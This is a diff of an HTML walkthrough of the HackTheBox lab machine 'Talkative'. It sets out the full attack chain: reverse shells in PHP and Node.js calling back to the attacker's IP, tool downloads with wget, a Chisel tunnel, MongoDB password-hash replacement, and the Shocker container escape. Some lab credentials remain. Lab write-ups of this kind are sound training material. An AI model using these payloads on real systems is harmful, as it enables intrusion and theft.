 <p>We are <strong>root inside a Docker container</strong>. The hostname (<code>b06821bbda78</code>) is a container ID, confirming we're not on the real host yet.</p>
-<h3 id="hacker-mindset-3">Hacker mindset</h3>
+
 <ul>
-<li><strong>Trust the software's own features.</strong> We didn't exploit a memory corruption bug — we used the application exactly as designed. The built-in R interpreter IS the vulnerability because it was exposed without authentication.</li>
-<li><strong>Always run as root in containers.</strong> Docker containers often run processes as root internally. This is bad practice but common. Root inside the container means we can do anything within it — including reading sensitive files.</li>
+<li><strong>Trust the software's own features.</strong> We didn't exploit a memory corruption bug - we used the application exactly as designed. The built-in R interpreter IS the vulnerability because it was exposed without authentication.</li>
+<li><strong>Always run as root in containers.</strong> Docker containers often run processes as root internally. This is bad practice but common. Root inside the container means we can do anything within it - including reading sensitive files.</li>
 <li><strong>Reverse shells, not bind shells.</strong> We connect back to ourselves (reverse) rather than opening a port on the target (bind), because firewalls typically block inbound connections but allow outbound ones.</li>
 </ul>
-<hr />
+<hr>
 <h2 id="step-4-credential-extraction-from-omv-file">Step 4: Credential Extraction from .omv File</h2>
 <h3 id="what-we-find">What we find</h3>
 <p>In <code>/root</code> of the Jamovi container:</p>
@@ -135,17 +135,17 @@ uid=0(root) gid=0(root) groups=0(root)
 # bolt-administration.omv
 </code></pre>
 <p>A <code>.omv</code> file is a Jamovi project document. The name "bolt-administration" is an obvious hint.</p>
-<h3 id="what-we-do-3">What we do</h3>
-<p><strong>In the container — base64 encode the file:</strong></p>
+
+<p><strong>In the container - base64 encode the file:</strong></p>
 <pre><code class="language-bash" data-language="bash">cat /root/bolt-administration.omv | base64 -w 0
 </code></pre>
-<p><strong>On Kali — decode and extract:</strong></p>
+<p><strong>On Kali - decode and extract:</strong></p>
 <pre><code class="language-bash" data-language="bash">echo 'BASE64_STRING' | base64 -d &gt; /tmp/bolt-administration.omv
 cd /tmp &amp;&amp; unzip bolt-administration.omv
 cat xdata.json | python3 -m json.tool
 </code></pre>
-<h3 id="why-this-works-2">Why this works</h3>
-<p><code>.omv</code> files are just ZIP archives. Inside, <code>xdata.json</code> contains the spreadsheet data. Someone stored credentials in a Jamovi spreadsheet and left it on the server — a classic example of insecure credential storage.</p>
+
+<p><code>.omv</code> files are just ZIP archives. Inside, <code>xdata.json</code> contains the spreadsheet data. Someone stored credentials in a Jamovi spreadsheet and left it on the server - a classic example of insecure credential storage.</p>
 <h3 id="credentials-found">Credentials found</h3>
 <table aria-label="Credentials found data table">
 <thead>
@@ -167,22 +167,22 @@ cat xdata.json | python3 -m json.tool
 <td><code>)SQWGm&gt;9KHEA</code></td>
 </tr>
 </tbody></table>
-<h3 id="hacker-mindset-4">Hacker mindset</h3>
+
 <ul>
-<li><strong>Interesting filenames are not accidents.</strong> "bolt-administration.omv" screams "try these on Bolt CMS". The box creator left a breadcrumb.</li>
-<li><strong>All file formats can hide data.</strong> A statistical analysis file containing passwords is unusual, but attackers look inside everything — ZIP archives, Office documents, databases. Never assume a file is "just data".</li>
+<li><strong>Interesting filenames are not accidents.</strong> "bolt-administration.omv" suggests "try these on Bolt CMS". The box creator left a breadcrumb.</li>
+<li><strong>All file formats can hide data.</strong> A statistical analysis file containing passwords is unusual, but attackers look inside everything - ZIP archives, Office documents, databases. Never assume a file is "just data".</li>
 <li><strong>Base64 is the universal file transfer protocol</strong> when you have a shell but no tools. It turns binary into text you can copy-paste through any terminal.</li>
 <li><strong>Try credentials everywhere immediately.</strong> Once you have credentials, spray them on every service before moving on.</li>
 </ul>
-<hr />
-<h2 id="step-5-bolt-cms-code-execution-shell-in-container-2">Step 5: Bolt CMS Code Execution — Shell in Container 2</h2>
+<hr>
+<h2 id="step-5-bolt-cms-code-execution-shell-in-container-2">Step 5: Bolt CMS Code Execution: Shell in Container 2</h2>
 <h3 id="background-2">Background</h3>
-<p>Bolt CMS is a PHP-based content management system. When logged in as admin, it allows editing PHP configuration files and Twig templates. We'll abuse the ability to edit <code>bundles.php</code> — a PHP file that's executed when Bolt loads — to inject a reverse shell.</p>
-<h3 id="what-we-do-4">What we do</h3>
+<p>Bolt CMS is a PHP-based content management system. When logged in as admin, it allows editing PHP configuration files and Twig templates. We'll abuse the ability to edit <code>bundles.php</code> - a PHP file that's executed when Bolt loads - to inject a reverse shell.</p>
+
 <p><strong>Navigate to Bolt admin:</strong></p>
 <pre><code>http://talkative.htb/bolt/login
 Username: admin
-Password: null   (matt's password — reused by the admin account)
+Password: REDACTED   (matt's password - reused by the admin account)
 </code></pre>
 <p><strong>Start a listener:</strong></p>
 <pre><code class="language-bash" data-language="bash">nc -lnvp 443
@@ -199,10 +199,10 @@ $proc=proc_open("/bin/sh",array(0=&gt;$sock,1=&gt;$sock,2=&gt;$sock),$pipes);
 </code></pre>
 <ol>
 <li>Click <strong>Save changes</strong></li>
-<li>Visit <code>http://talkative.htb/bolt</code> — loading the dashboard executes <code>bundles.php</code></li>
+<li>Visit <code>http://talkative.htb/bolt</code> : loading the dashboard executes <code>bundles.php</code></li>
 </ol>
-<h3 id="why-this-works-3">Why this works</h3>
-<p><code>bundles.php</code> is a PHP file that Bolt CMS loads as part of its bootstrap process. By injecting PHP code into it, we make the server execute our code every time that file is included. <code>fsockopen</code> opens a TCP connection to our machine, and <code>proc_open</code> spawns a shell with its stdin/stdout/stderr connected to that socket — giving us a shell.</p>
+
+<p><code>bundles.php</code> is a PHP file that Bolt CMS loads as part of its bootstrap process. By injecting PHP code into it, we make the server execute our code every time that file is included. <code>fsockopen</code> opens a TCP connection to our machine, and <code>proc_open</code> spawns a shell with its stdin/stdout/stderr connected to that socket - giving us a shell.</p>
 <h3 id="why-not-twig-ssti">Why not Twig SSTI?</h3>
 <p>The Twig template injection approach (used in other writeups) can fail due to:</p>
 <ul>
@@ -211,56 +211,56 @@ $proc=proc_open("/bin/sh",array(0=&gt;$sock,1=&gt;$sock,2=&gt;$sock),$pipes);
 <li>Cache not being cleared properly</li>
 </ul>
 <p>The <code>bundles.php</code> PHP injection is more reliable because it's direct PHP execution with no intermediary template engine.</p>
-<h3 id="result-2">Result</h3>
+
 <pre><code>id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 hostname -I
 172.17.0.8
 </code></pre>
-<p>We're <strong>www-data inside another Docker container</strong> (172.17.0.8 — the Bolt CMS container).</p>
-<h3 id="hacker-mindset-5">Hacker mindset</h3>
+<p>We're <strong>www-data inside another Docker container</strong> (172.17.0.8 - the Bolt CMS container).</p>
+
 <ul>
 <li><strong>Admin access to a CMS = code execution.</strong> This is almost always true. CMS platforms by design let admins customize the site with code. That's the attack primitive.</li>
-<li><strong>When one exploit fails, try another path.</strong> The Twig SSTI is the "textbook" exploit here, but the PHP file edit achieves the same goal with less friction. Hackers are pragmatic — use what works.</li>
+<li><strong>When one exploit fails, try another path.</strong> The Twig SSTI is the "textbook" exploit here, but the PHP file edit achieves the same goal with less friction. Hackers are pragmatic - use what works.</li>
 <li><strong>Password reuse is endemic.</strong> The credentials from the Jamovi file were for <code>matt@talkative.htb</code>, but they also work for the <code>admin</code> Bolt account. Always try credentials on every service.</li>
-<li><strong>"www-data" is not the end.</strong> We have limited privileges in this container, but it has SSH client installed — which means we can pivot.</li>
+<li><strong>"www-data" is not the end.</strong> We have limited privileges in this container, but it has SSH client installed - which means we can pivot.</li>
 </ul>
-<hr />
-<h2 id="step-6-ssh-pivot-to-host-user-flag">Step 6: SSH Pivot to Host — User Flag</h2>
+<hr>
+<h2 id="step-6-ssh-pivot-to-host-user-flag">Step 6: SSH Pivot to Host: User Flag</h2>
 <h3 id="background-3">Background</h3>
 <p>We're in the Bolt CMS container (172.17.0.8). Docker containers communicate with the host via a bridge network. The <strong>Docker bridge gateway</strong> (<code>172.17.0.1</code> or <code>172.18.0.1</code>) is actually the host machine's IP on the Docker network. Port 22 was filtered from the outside, but <strong>from inside a container, SSH to the host is possible</strong>.</p>
-<h3 id="what-we-do-5">What we do</h3>
+
 <p><strong>Upgrade the shell first (needed for SSH to work interactively):</strong></p>
 <pre><code class="language-bash" data-language="bash">script /dev/null -c bash
 </code></pre>
 <p><strong>SSH to the host:</strong></p>
 <pre><code class="language-bash" data-language="bash">ssh saul@172.18.0.1
-# Password: null
+# Password: REDACTED
 </code></pre>
 <p><strong>Grab the user flag:</strong></p>
 <pre><code class="language-bash" data-language="bash">cat ~/user.txt
 # 4bbc98[redacted]bdc815e47
 </code></pre>
-<h3 id="why-this-works-4">Why this works</h3>
-<p>The Docker bridge gateway IP (<code>172.18.0.1</code>) is the host machine. The host runs SSH on port 22, but that port is firewalled from the internet. From inside a container on the same Docker network, that firewall rule doesn't apply — we can reach port 22 directly.</p>
-<p>The password <code>jeO09ufhWD&lt;s</code> (originally associated with matt's email) is reused by saul's SSH account — another case of credential reuse.</p>
+
+<p>The Docker bridge gateway IP (<code>172.18.0.1</code>) is the host machine. The host runs SSH on port 22, but that port is firewalled from the internet. From inside a container on the same Docker network, that firewall rule doesn't apply - we can reach port 22 directly.</p>
+<p>The password <code>REDACTED</code> (originally associated with matt's email) is reused by saul's SSH account - another case of credential reuse.</p>
 <h3 id="why-172-18-0-1-and-not-172-17-0-1">Why <code>172.18.0.1</code> and not <code>172.17.0.1</code>?</h3>
 <p>The machine runs two Docker bridge networks:</p>
 <ul>
-<li><code>172.17.0.0/16</code> — <code>docker0</code> bridge (where most containers live)</li>
-<li><code>172.18.0.0/16</code> — <code>br-ea74c394a147</code> bridge (where Jamovi lives)</li>
+<li><code>172.17.0.0/16</code> : <code>docker0</code> bridge (where most containers live)</li>
+<li><code>172.18.0.0/16</code> : <code>br-ea74c394a147</code> bridge (where Jamovi lives)</li>
 </ul>
-<p>The Bolt container is on the <code>172.17.0.0</code> network, so the gateway is <code>172.17.0.1</code>. However, both bridge IPs are on the same host — both work for SSH. In practice, try both if one fails.</p>
-<h3 id="hacker-mindset-6">Hacker mindset</h3>
+<p>The Bolt container is on the <code>172.17.0.0</code> network, so the gateway is <code>172.17.0.1</code>. However, both bridge IPs are on the same host - both work for SSH. In practice, try both if one fails.</p>
+
 <ul>
 <li><strong>"Filtered" means filtered from outside, not from everywhere.</strong> SSH being filtered externally is irrelevant once you have an internal foothold. Internal networks are often far more permissive.</li>
 <li><strong>The gateway is the host.</strong> In Docker environments, <code>172.17.0.1</code> (or whatever the bridge gateway is) is almost always the physical host machine. This is a fundamental Docker networking concept every pentester must know.</li>
 <li><strong><code>script /dev/null -c bash</code> is the essential shell upgrade.</strong> Without a proper TTY, SSH won't work interactively (it can't display the password prompt correctly). This one-liner promotes our dumb shell to a proper terminal.</li>
 </ul>
-<hr />
+<hr>
 <h2 id="step-7-docker-network-enumeration">Step 7: Docker Network Enumeration</h2>
-<h3 id="what-we-do-6">What we do</h3>
+
 <p>As saul on the host, enumerate all Docker containers:</p>
 <pre><code class="language-bash" data-language="bash">ps auxww | grep docker
 </code></pre>
@@ -295,7 +295,7 @@ hostname -I
 <td>Bolt instances (per-player)</td>
 </tr>
 </tbody></table>
-<p><strong>Interesting:</strong> <code>172.17.0.2</code> has no external port forward, meaning it's hidden from the outside. Let's scan it:</p>
+<p><strong>Interesting:</strong> <code>172.17.0.2</code> has no external port forward, meaning it's hidden from the outside. Scan it:</p>
 <pre><code class="language-bash" data-language="bash"># Upload a static nmap binary first
 wget http://10.10.16.84/nmap -O /dev/shm/nmap
 chmod +x /dev/shm/nmap
@@ -305,24 +305,24 @@ chmod +x /dev/shm/nmap
 # 27017/tcp open  unknown
 </code></pre>
 <p><strong>Port 27017 = MongoDB.</strong> And it has no authentication (the startup warnings from MongoDB will confirm this later).</p>
-<h3 id="hacker-mindset-7">Hacker mindset</h3>
+
 <ul>
-<li><strong>Map the internal network before you exploit it.</strong> Understanding the full topology prevents you from missing attack paths. The <code>ps auxww | grep docker</code> trick is elegant — docker-proxy processes literally list every container and its ports.</li>
-<li><strong>Hidden services are often more vulnerable.</strong> <code>172.17.0.2</code> has no external port forward precisely because it's an internal service. Internal services are often configured with no authentication because "nothing external can reach it" — a false sense of security.</li>
+<li><strong>Map the internal network before you exploit it.</strong> Understanding the full topology prevents you from missing attack paths. The <code>ps auxww | grep docker</code> trick is elegant - docker-proxy processes literally list every container and its ports.</li>
+<li><strong>Hidden services are often more vulnerable.</strong> <code>172.17.0.2</code> has no external port forward precisely because it's an internal service. Internal services are often configured with no authentication because "nothing external can reach it" - a false sense of security.</li>
 <li><strong>27017 = MongoDB.</strong> Port numbers are a language. Learn the common ones: 27017 (MongoDB), 6379 (Redis), 5432 (PostgreSQL), 9200 (Elasticsearch). All of these are frequently misconfigured with no authentication in containerized environments.</li>
 </ul>
-<hr />
+<hr>
 <h2 id="step-8-chisel-tunnel-to-mongodb">Step 8: Chisel Tunnel to MongoDB</h2>
 <h3 id="background-4">Background</h3>
-<p>MongoDB is at <code>172.17.0.2:27017</code> — reachable from the host (saul's shell) but not from our Kali machine. <strong>Chisel</strong> is a TCP tunnel tool that creates a reverse port forward: the target connects OUT to us, and we forward a local port through that connection to MongoDB.</p>
-<h3 id="what-we-do-7">What we do</h3>
-<p><strong>On Kali — start Chisel server:</strong></p>
+<p>MongoDB is at <code>172.17.0.2:27017</code> - reachable from the host (saul's shell) but not from our Kali machine. <strong>Chisel</strong> is a TCP tunnel tool that creates a reverse port forward: the target connects OUT to us, and we forward a local port through that connection to MongoDB.</p>
+
+<p><strong>On Kali - start Chisel server:</strong></p>
 <pre><code class="language-bash" data-language="bash">chisel server -p 8000 --reverse
 </code></pre>
 <p><strong>Serve chisel to the target:</strong></p>
 <pre><code class="language-bash" data-language="bash">python3 -m http.server 9999 -d /tmp
 </code></pre>
-<p><strong>On the host (saul's shell) — download and connect:</strong></p>
+<p><strong>On the host (saul's shell) - download and connect:</strong></p>
 <pre><code class="language-bash" data-language="bash">cd /dev/shm
 wget http://10.10.16.84:9999/chisel
 chmod +x chisel
@@ -331,17 +331,17 @@ chmod +x chisel
 <p><strong>Result:</strong> Port <code>127.0.0.1:27017</code> on our Kali machine now tunnels directly to <code>172.17.0.2:27017</code> (MongoDB inside the Docker network).</p>
 <h3 id="why-chisel">Why Chisel?</h3>
 <p>Chisel uses WebSockets over HTTP, which looks like normal web traffic. It works even through strict egress firewalls. The <code>--reverse</code> flag means the CLIENT (target) opens a tunnel to the server (us) and lets the server forward ports. This is critical because we can't reach the target directly on arbitrary ports.</p>
-<h3 id="hacker-mindset-8">Hacker mindset</h3>
+
 <ul>
 <li><strong>Pivoting is a core skill.</strong> You will almost never have a direct path from your machine to every target. Learning to tunnel through intermediate hosts is essential.</li>
 <li><strong><code>R:</code> means reverse tunnel.</strong> In Chisel, <code>R:27017:172.17.0.2:27017</code> means "on the server side (Kali), open port 27017 and forward it through the client connection to 172.17.0.2:27017". The R prefix is the key distinction.</li>
 <li><strong><code>/dev/shm</code> is your staging area.</strong> It's a RAM-based tmpfs mount that's writable, executable (usually), and gets wiped on reboot. It doesn't show up in disk forensics as easily as writing to <code>/tmp</code> or the home directory.</li>
 </ul>
-<hr />
+<hr>
 <h2 id="step-9-rocket-chat-admin-takeover-via-mongodb">Step 9: Rocket.Chat Admin Takeover via MongoDB</h2>
 <h3 id="background-5">Background</h3>
-<p>Rocket.Chat stores all its data — including user accounts and password hashes — in MongoDB. The database has <strong>no authentication</strong>, meaning anyone who can reach it has full read/write access to everything, including the ability to change any user's password.</p>
-<h3 id="what-we-do-8">What we do</h3>
+<p>Rocket.Chat stores all its data - including user accounts and password hashes - in MongoDB. The database has <strong>no authentication</strong>, meaning anyone who can reach it has full read/write access to everything, including the ability to change any user's password.</p>
+
 <p><strong>Connect to MongoDB from Kali:</strong></p>
 <pre><code class="language-bash" data-language="bash">mongo 127.0.0.1:27017
 </code></pre>
@@ -356,29 +356,29 @@ db.users.find({}, {username:1, roles:1, emails:1})
 <p><strong>Reset the admin password to <code>password123</code>:</strong></p>
 <pre><code class="language-javascript" data-language="javascript">db.getCollection('users').update(
   {username: "admin"},
-  { $set: {"services": {"password": null "$2b$10$P.[redacted encoded lab material]"}}}}
+  { $set: {"services": {"password": {"bcrypt": "$2b$10$P.REDACTED_ENCODED_LAB_MATERIAL"}}}}
 )
 // WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
 </code></pre>
-<p>The bcrypt hash <code>$2b$10$P.[redacted encoded lab material]</code> is the hash of <code>password123</code>. We copied it from a test account we registered earlier (whose password we set to <code>password123</code>).</p>
-<h3 id="why-this-works-5">Why this works</h3>
+<p>The bcrypt hash <code>$2b$10$P.REDACTED_ENCODED_LAB_MATERIAL</code> is the hash of <code>password123</code>. We copied it from a test account we registered earlier (whose password we set to <code>password123</code>).</p>
+
 <p>Rocket.Chat uses MongoDB as its backend database (it's built on Meteor, which uses MongoDB natively). Password hashes are stored in <code>meteor.users.services.password.bcrypt</code>. Since MongoDB has no auth, we can update this field directly. Rocket.Chat will then accept the new hash when we log in.</p>
 <h3 id="log-into-rocket-chat">Log into Rocket.Chat</h3>
 <pre><code>http://talkative.htb:3000
 Username: admin
-Password: null
+Password: REDACTED
 </code></pre>
-<h3 id="hacker-mindset-9">Hacker mindset</h3>
+
 <ul>
-<li><strong>No-auth databases are complete compromises.</strong> If you reach an unauthenticated MongoDB, Redis, or Elasticsearch, assume full data access and full application takeover. It's game over for that service.</li>
-<li><strong>You don't need to crack password hashes — replace them.</strong> Cracking bcrypt is computationally expensive. But if you have write access to the database, just replace the hash with one you already know. This is far faster and more reliable.</li>
+<li><strong>No-auth databases are complete compromises.</strong> If you reach an unauthenticated MongoDB, Redis, or Elasticsearch, assume full data access and full application takeover. That service is fully compromised.</li>
+<li><strong>You don't need to crack password hashes - replace them.</strong> Cracking bcrypt is computationally expensive. But if you have write access to the database, just replace the hash with one you already know. This is far faster and more reliable.</li>
 <li><strong>Admin access to a platform = more code execution.</strong> Just as with Bolt CMS, getting admin access to Rocket.Chat opens up administrative features that can execute code. That's our next step.</li>
 </ul>
-<hr />
-<h2 id="step-10-rocket-chat-webhook-rce-shell-in-container-3">Step 10: Rocket.Chat Webhook RCE — Shell in Container 3</h2>
+<hr>
+<h2 id="step-10-rocket-chat-webhook-rce-shell-in-container-3">Step 10: Rocket.Chat Webhook RCE: Shell in Container 3</h2>
 <h3 id="background-6">Background</h3>
-<p>Rocket.Chat's <strong>Integrations</strong> feature allows admins to create webhooks — HTTP endpoints that execute JavaScript code when triggered. This is a legitimate feature for automating messages and notifications. We abuse it to run a Node.js reverse shell.</p>
-<h3 id="what-we-do-9">What we do</h3>
+<p>Rocket.Chat's <strong>Integrations</strong> feature allows admins to create webhooks - HTTP endpoints that execute JavaScript code when triggered. This is a legitimate feature for automating messages and notifications. We abuse it to run a Node.js reverse shell.</p>
+
 <p><strong>Start a listener:</strong></p>
 <pre><code class="language-bash" data-language="bash">nc -lnvp 4444
 </code></pre>
@@ -399,7 +399,7 @@ client.connect(4444, "10.10.16.84", function(){
 });
 </code></pre>
 <ol>
-<li>Click <strong>Save Changes</strong> — copy the <strong>Webhook URL</strong> shown at the bottom</li>
+<li>Click <strong>Save Changes</strong> : copy the <strong>Webhook URL</strong> shown at the bottom</li>
 <li>Trigger the webhook:</li>
 </ol>
 <pre><code class="language-bash" data-language="bash">curl http://talkative.htb:3000/hooks/YOUR_ID/YOUR_TOKEN
@@ -409,7 +409,7 @@ client.connect(4444, "10.10.16.84", function(){
 <pre><code class="language-javascript" data-language="javascript">const require = console.log.constructor('return process.mainModule.require')();
 </code></pre>
 <p>Escapes the sandbox by using <code>Function</code> constructor (accessible via <code>console.log.constructor</code>) to create a new function that returns Node.js's module system. This is a well-known sandbox escape for Rocket.Chat webhook scripts.</p>
-<h3 id="result-3">Result</h3>
+
 <pre><code>id
 uid=0(root) gid=0(root) groups=0(root)
 
@@ -420,16 +420,16 @@ hostname -I
 172.17.0.3
 </code></pre>
 <p>Root in the <strong>Rocket.Chat Docker container</strong> (172.17.0.3).</p>
-<h3 id="hacker-mindset-10">Hacker mindset</h3>
+
 <ul>
-<li><strong>"Script execution" features in admin panels ARE code execution.</strong> Webhooks, automation scripts, template engines, cron jobs — if an admin panel lets you run "scripts", that's RCE. Full stop.</li>
+<li><strong>"Script execution" features in admin panels ARE code execution.</strong> Webhooks, automation scripts, template engines, cron jobs - if an admin panel lets you run "scripts", that's RCE. Full stop.</li>
 <li><strong>Sandbox escapes are well-documented.</strong> The <code>process.mainModule.require</code> trick is documented in countless resources. Before writing custom exploits, search for known bypasses for the specific platform/version you're targeting.</li>
 <li><strong>curl is the simplest exploit trigger.</strong> Once a webhook is configured, a single curl command is all it takes. Simple is better.</li>
 </ul>
-<hr />
+<hr>
 <h2 id="step-11-container-escape-via-cap-dac-read-search">Step 11: Container Escape via CAP_DAC_READ_SEARCH</h2>
 <h3 id="background-7">Background</h3>
-<p>Linux capabilities are fine-grained privileges that can be granted to processes independently of full root. The Rocket.Chat container has <code>CAP_DAC_READ_SEARCH</code> — a dangerous capability that <strong>bypasses DAC (Discretionary Access Control) read checks</strong>. Combined with the <code>open_by_handle_at()</code> system call, this allows reading ANY file on the <strong>host filesystem</strong> from inside the container.</p>
+<p>Linux capabilities are fine-grained privileges that can be granted to processes independently of full root. The Rocket.Chat container has <code>CAP_DAC_READ_SEARCH</code> - a dangerous capability that <strong>bypasses DAC (Discretionary Access Control) read checks</strong>. Combined with the <code>open_by_handle_at()</code> system call, this allows reading ANY file on the <strong>host filesystem</strong> from inside the container.</p>
 <h3 id="verify-the-capability">Verify the capability</h3>
 <pre><code class="language-bash" data-language="bash">cat /proc/1/status | grep CapEff
 # CapEff: 00000000a80425fd
@@ -439,12 +439,12 @@ hostname -I
 # includes cap_dac_read_search
 </code></pre>
 <h3 id="the-shocker-exploit">The Shocker Exploit</h3>
-<p>The <strong>Shocker exploit</strong> (<code>shocker.c</code>) abuses <code>open_by_handle_at()</code> — a syscall that opens files by their filesystem inode handle rather than by path. With <code>CAP_DAC_READ_SEARCH</code>, we can:</p>
+<p>The <strong>Shocker exploit</strong> (<code>shocker.c</code>) abuses <code>open_by_handle_at()</code> - a syscall that opens files by their filesystem inode handle rather than by path. With <code>CAP_DAC_READ_SEARCH</code>, we can:</p>
 <ol>
 <li>Get a file descriptor to a known file that's bind-mounted into the container (like <code>/etc/hosts</code>)</li>
 <li>Use that descriptor to get the filesystem handle for the host's root directory</li>
 <li>Walk the host's directory tree by inode to find any file</li>
-<li>Open and read that file — even though it's outside our container's filesystem namespace</li>
+<li>Open and read that file - even though it's outside our container's filesystem namespace</li>
 </ol>
 <h3 id="compile-the-exploit-on-kali">Compile the exploit on Kali</h3>
 <pre><code class="language-bash" data-language="bash">cd /tmp
@@ -467,10 +467,10 @@ x86_64-linux-gnu-gcc -o shocker shocker.c -static
 </code></pre>
 <h3 id="transfer-to-the-container">Transfer to the container</h3>
 <p>Since the container has no <code>wget</code>, <code>curl</code>, or <code>/dev/tcp</code> file access, use <strong>Node.js</strong> (which is available since Rocket.Chat is a Node.js app) to download it:</p>
-<p><strong>On Kali — serve the binary:</strong></p>
+<p><strong>On Kali - serve the binary:</strong></p>
 <pre><code class="language-bash" data-language="bash">python3 -m http.server 9999 -d /tmp
 </code></pre>
-<p><strong>In the container — download with Node.js and wait for DONE:</strong></p>
+<p><strong>In the container - download with Node.js and wait for DONE:</strong></p>
 <pre><code class="language-bash" data-language="bash">node -e "const h=require('http'),f=require('fs');h.get('http://10.10.16.84:9999/shocker',r=&gt;{const w=f.createWriteStream('/tmp/shocker');r.pipe(w);w.on('finish',()=&gt;{console.log('DONE');process.exit();})});"
 </code></pre>
 <h3 id="run-the-exploit">Run the exploit</h3>
@@ -487,21 +487,21 @@ x86_64-linux-gnu-gcc -o shocker shocker.c -static
 </ul>
 <p>These files exist in both the container and on the host, sharing the same underlying inode. Shocker uses this shared inode as its "entry point" to walk the host filesystem.</p>
 <h3 id="why-dockerinit-doesn-t-work">Why <code>/.dockerinit</code> doesn't work</h3>
-<p>Older Docker versions created <code>/.dockerinit</code> as a marker file inside containers. Modern Docker doesn't. The original shocker.c targets <code>/.dockerinit</code> — we must change this to a file that actually exists.</p>
-<h3 id="hacker-mindset-11">Hacker mindset</h3>
+<p>Older Docker versions created <code>/.dockerinit</code> as a marker file inside containers. Modern Docker doesn't. The original shocker.c targets <code>/.dockerinit</code> - we must change this to a file that actually exists.</p>
+
 <ul>
 <li><strong>Container ≠ security boundary when capabilities are misconfigured.</strong> Docker containers are NOT VMs. They share the host kernel. Dangerous capabilities like <code>CAP_DAC_READ_SEARCH</code>, <code>CAP_SYS_ADMIN</code>, or <code>CAP_NET_ADMIN</code> can completely undermine container isolation.</li>
-<li><strong>Understand what you're exploiting.</strong> The Shocker exploit is elegant — it doesn't break out of the container's filesystem namespace directly. Instead, it uses a legitimate syscall (<code>open_by_handle_at</code>) in an unintended way. Understanding the primitives (inode handles, bind mounts, kernel syscalls) makes you a better attacker and defender.</li>
+<li><strong>Understand what you're exploiting.</strong> The Shocker exploit is elegant - it doesn't break out of the container's filesystem namespace directly. Instead, it uses a legitimate syscall (<code>open_by_handle_at</code>) in an unintended way. Understanding the primitives (inode handles, bind mounts, kernel syscalls) makes you a better attacker and defender.</li>
 <li><strong>Cross-compilation is a critical skill.</strong> Your attacker machine is ARM64. The target is x86_64. <code>x86_64-linux-gnu-gcc</code> is the cross-compiler for this. Always verify the target architecture before compiling.</li>
-<li><strong>File transfer is often the hardest part.</strong> No wget, no curl, no /dev/tcp — but Node.js is available. Enumerate what tools exist and find creative solutions. The hacker mindset is: "if I can't use tool A, what else achieves the same goal?"</li>
+<li><strong>File transfer is often the hardest part.</strong> No wget, no curl, no /dev/tcp - but Node.js is available. Enumerate what tools exist and find creative solutions. The reasoning is: "if I can't use tool A, what else achieves the same goal?"</li>
 </ul>
-<hr />
+<hr>
 <h2 id="step-12-root-flag">Step 12: Root Flag</h2>
 <pre><code>[!] Win! /root/root.txt output follows:
 2158d5[redacted]a1d44b85
 </code></pre>
 <p>The Shocker exploit reads <code>/root/root.txt</code> directly from the host filesystem, even though we're inside a Docker container.</p>
-<hr />
+<hr>
 <h2 id="full-attack-chain-summary">Full Attack Chain Summary</h2>
 <pre><code>[Kali 10.10.16.84]
         │
@@ -555,25 +555,25 @@ x86_64-linux-gnu-gcc -o shocker shocker.c -static
 [Host /root/root.txt]
   - ROOT FLAG: /root/root.txt ✓
 </code></pre>
-<hr />
-<h2 id="key-lessons-and-hacker-mindset-summary">Key Lessons &amp; Hacker Mindset Summary</h2>
+<hr>
+<h2 id="key-lessons">Key lessons</h2>
 <h3 id="1-no-authentication-immediate-exploitation">1. No Authentication = Immediate Exploitation</h3>
-<p>Jamovi and MongoDB both had zero authentication. Any service exposed without authentication should be your first target — the attack barrier is essentially zero.</p>
+<p>Jamovi and MongoDB both had zero authentication. Any service exposed without authentication should be your first target - the attack barrier is essentially zero.</p>
 <h3 id="2-credentials-found-anywhere-used-everywhere">2. Credentials Found Anywhere, Used Everywhere</h3>
 <p>A Jamovi spreadsheet file contained Bolt CMS credentials. Those same credentials worked for SSH. Always spray every credential you find against every service available.</p>
 <h3 id="3-admin-cms-access-code-execution">3. Admin CMS Access = Code Execution</h3>
-<p>Whether it's Bolt CMS, WordPress, or Rocket.Chat — admin access to a web application that supports custom scripts/templates/plugins is effectively code execution. This is by design, and attackers abuse it regularly.</p>
+<p>Whether it's Bolt CMS, WordPress, or Rocket.Chat - admin access to a web application that supports custom scripts/templates/plugins is effectively code execution. This is by design, and attackers abuse it regularly.</p>
 <h3 id="4-docker-is-not-a-security-boundary">4. Docker is Not a Security Boundary</h3>
 <p>Containers share the host kernel. Misconfigured capabilities (<code>CAP_DAC_READ_SEARCH</code>), exposed Docker sockets, or privileged containers can completely break container isolation. Never assume root-in-container is safe.</p>
 <h3 id="5-internal-services-are-often-unprotected">5. Internal Services Are Often Unprotected</h3>
 <p>MongoDB had no auth because "only internal containers can reach it." This false sense of security is extremely common. Once you pivot inside the network, internal services become your attack surface.</p>
 <h3 id="6-pivoting-is-the-core-skill">6. Pivoting is the Core Skill</h3>
-<p>This box required 6 distinct hops to get the root flag. Enumeration at each step revealed the next target. The ability to pivot — through containers, across Docker networks, via tunnels — is what separates average pentesters from great ones.</p>
+<p>This box required 6 distinct hops to get the root flag. Enumeration at each step revealed the next target. The ability to pivot - through containers, across Docker networks, via tunnels - is what separates average pentesters from great ones.</p>
 <h3 id="7-when-one-exploit-fails-try-another">7. When One Exploit Fails, Try Another</h3>
-<p>The Twig SSTI approach for Bolt CMS didn't work in our environment. We pivoted to PHP file injection and achieved the same result. Hackers don't give up when the first technique fails — they adapt.</p>
+<p>The Twig SSTI approach for Bolt CMS didn't work in our environment. We pivoted to PHP file injection and achieved the same result. Hackers don't give up when the first technique fails - they adapt.</p>
 <h3 id="8-understand-your-tools">8. Understand Your Tools</h3>
 <p>Knowing WHY Shocker works (bind mounts + <code>open_by_handle_at()</code> + <code>CAP_DAC_READ_SEARCH</code>) lets you adapt it when the default target file (<code>/.dockerinit</code>) doesn't exist. Blindly running tools without understanding them leads to failure when conditions differ from the tutorial.</p>
-<hr />
+<hr>
 <h2 id="tools-used">Tools Used</h2>
 <table aria-label="Tools Used data table">
 <thead>
@@ -635,11 +635,10 @@ x86_64-linux-gnu-gcc -o shocker shocker.c -static
 <td>File transfer in tool-less container</td>
 </tr>
 </tbody></table>
-<hr />
-<p><em>Walkthrough by: HTB Player | Machine: Talkative (Hard) | Platform: HackTheBox</em></p>
-15:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$1a"}}]
